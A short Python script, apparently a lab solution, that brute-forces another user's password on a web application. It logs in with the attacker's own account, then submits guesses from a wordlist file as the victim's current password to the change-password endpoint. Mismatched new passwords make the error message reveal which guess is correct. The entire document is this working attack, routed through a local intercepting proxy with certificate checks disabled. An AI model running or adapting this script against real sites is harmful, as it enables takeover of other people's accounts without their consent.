import requests
import sys
import urllib3


proxy = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
        }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def brute_force_password(url:str,username:str,passwd:str,vusername:str):
    
    login_url = url+'/login'
    change_password_url = url+'/my-account/change-password'
    session = requests.Session()

    login_params = {
        "username":username,
        "password":passwd
    }
    # Login with valid creds
    session.post(login_url,verify=False,data=login_params,proxies=proxy)
    
    
    with open("./passwds","r") as passwords_file:
        passwds = [password.rstrip() for password in passwords_file]
    
    for password in passwds:
        # change password params
        # username, currentpassword , new-password-1, new-pass 2 
        params ={
            "username":vusername,
            "current-password":password,
            "new-password-1":"test1",
            "new-password-2":"test2"
        }
        response = session.post(change_password_url,verify=False,proxies=proxy,data=params)
        if "New passwords do not match" in response.text:
            print(f"(+) Valid Creds for vicitm username: {vusername} , password: {password}")
            sys.exit(1)
            break






def main():
    if len(sys.argv) !=5:
        print(f"(-) Usage {sys.argv[0]} http://example.com 'your username' 'your password' 'victim_username'")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    passwd = sys.argv[3]
    vusername=sys.argv[4]

    brute_force_password(url,username,passwd,vusername)

if __name__ =="__main__":
    
    main()